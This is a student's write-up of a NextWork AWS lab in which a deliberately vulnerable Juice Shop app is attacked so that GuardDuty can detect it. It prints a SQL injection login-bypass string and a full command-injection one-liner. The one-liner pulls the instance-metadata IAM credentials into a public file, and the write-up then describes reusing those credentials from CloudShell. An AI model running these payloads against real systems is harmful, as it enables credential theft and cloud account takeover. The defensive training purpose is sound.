<img src="https://cdn.prod.website-files.com/677c400686e724409a5a7409/6790ad949cf622dc8dcd9fe4_nextwork-logo-leather.svg" alt="NextWork" width="300" />

# Threat Detection with GuardDuty

**Project Link:** [View Project](https://nextwork.ai/projects/d3694045-8dc9-5910-99bc-061c82f1bccd)

**Author:** Odunuga Abd fattah  
**Email:** odunugaabdfattah@gmail.com

---

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_v1w2x3y4)

## Introducing Today's Project!

### Tools and concepts

The services I used were CloudFormation, GuardDuty, S3, EC2 e.t.c. Key concepts I learnt include Infrastructure as code, malware protection, GuardDuty findings, OWASP Juice App e.t.c

### Project reflection

This project took me approximately 3 hours. The most challenging part was. using an old CloudFormation Template It was most rewarding to actually see CREATED.

Why did you do this project today? Did this project meet your goals?

I did it to enhance my Cloud Engineering Skills and yes it helped.

Thank you Nextwork.

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches 27 resources. The three main components are the Web App Infrastructure (which entails EC2, Networking and Cloud Front), S3 Bucket (Storage) and GuardDuty (Threat Detection and Response).

The web app deployed is called OWASP Juice Shop. To practice my GuardDuty skills, I will analyze the logs entry GuardDuty picks up.

GuardDuty is a threat detection engine that uses Machine Learning to detect anomalies in one's architecture. In this project, it will be used to detect the threats and vulnerabilities in our Web App.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_n1o2p3q4)

## SQL Injection

The first attack I performed on the web app is SQL injection, which means inserting a malicious SQL code into an application's database queries. SQL injection is a security risk because it gives an attacker an escalated privilegd which can be used to steal or modify database.

My SQL injection attack involved passing this (' or 1=1;--) code into the  authentication checkbox. This means that the application takes this query and evaluate it to true which bypasses authentication check

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_h1i2j3k4)

## Command Injection

Next, I used command injection, which is a security vulnerability when an attacker injects command into a server. The Juice Shop web app is vulnerable to this because it doesn't sanitize its input field making it vulnerable for this attack.

To run command injection, I. ran the following script: 
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}


The script will manipulate the server into giving it's sensitive data and also storing that data publicly for prospective attackers.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_t3u4v5w6)

## Attack Verification

To verify the attack's success, I navigated to the URL where the arbitrary code I inserted earlier pointed towards. The credentials page showed me some sensitive informations which could really lead to a disaster if a reall atatcker was able to get this informations.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_x7y8z9a0)

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell, because it'll aid in event logging because we are using a different credentials on the Cloudshell.

In CloudShell, I used wget to download the stolen credentials to my CloudShell, Next, I ran a command using cat and jq to give the output of the credentials in JSON format for better understanding.

I then set up a profile, called stolen to use the syolden credentials to hack into AWS environment. I had to create a new profile because I don't have one before and I need it to authenticate the hack.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_j9k0l1m2)

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding within ASAP. Findings are 2 findings (High and Low).

a. The API PutCredentials was invoked using root credentials. (Low).

b. Credentials for the EC2 instance role NextWork-GuardDuty-project-s23rez-TheRole-8e5vTEh4wFSF were used from a remote AWS account. (High)

GuardDuty's finding was called Credentials for the EC2 instance role NextWork-GuardDuty-project-s23rez-TheRole-8e5vTEh4wFSF were used from a remote AWS account., which means credentials meant for EC2 instance was used in an abnormal way in an AWS account. Anomaly detection was used because the purpose the credentials was used for was unusual to what it's meant for.

GuardDutys detailed finding reported that Credentials created exclusively for an EC2 instance using instance role NextWork-GuardDuty-project-s23rez-TheRole-8e5vTEh4wFSF have been used from a remote AWS account 365181504314.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_v1w2x3y4)

## Extra: Malware Protection

For my project extension, I enabled malware protection forS3. Malware is a software designed to harm computers i.e worms, virus, trjan e.t.c.

To test Malware Protection, I uploaaded a malware file in the Malware potected S3 bucket. The uploaded file won't actually cause damage because it is a test file.

Once I uploaded the file, GuardDuty instantly triggered an alert. This verified that the malware protection on GuardDuty is active.

![Image](https://nextwork.ai/hopeful_brown_agile_finger_lime/uploads/d3694045-8dc9-5910-99bc-061c82f1bccd_sm42x3y4)

---

*Built with [NextWork](https://nextwork.ai) - [View this project](https://nextwork.ai/projects/d3694045-8dc9-5910-99bc-061c82f1bccd)*
